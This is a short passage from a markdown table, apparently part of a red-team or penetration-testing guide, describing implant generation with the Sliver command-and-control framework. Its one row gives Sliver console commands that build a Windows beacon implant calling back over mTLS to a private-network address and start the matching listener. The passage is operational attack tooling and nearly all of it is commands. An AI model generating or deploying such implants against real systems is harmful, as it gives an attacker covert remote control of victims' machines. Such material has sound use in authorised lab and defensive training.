...
|:-------------|:-------------------------------|:-------------------------|
| Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring. | ```<br>sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save <br> sliver > mtls<br>```  |
